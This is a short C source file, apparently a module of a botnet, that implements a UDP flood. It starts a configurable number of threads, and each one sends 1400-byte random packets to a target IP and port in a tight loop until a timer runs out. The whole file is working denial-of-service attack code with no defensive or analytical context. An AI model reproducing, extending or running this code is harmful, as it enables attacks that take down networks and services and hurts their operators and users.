#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *udp_worker(void *arg) {
    target_t *t = arg;
    XorShift64 *rng = rng_new();

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &sin.sin_addr);

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { free(rng); return NULL; }

    char databuf[1400];
    rng_fill(rng, (uint8_t*)databuf, 1400);

    time_t end = time(NULL) + t->sec;
    int check = 1000;
    while (running) {
        if (--check <= 0) { if (time(NULL) >= end) break; check = 1000; }
        sendto(fd, databuf, 1400, 0, (struct sockaddr*)&sin, sizeof(sin));
    }

    close(fd); free(rng);
    return NULL;
}

void flood_udp(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, udp_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
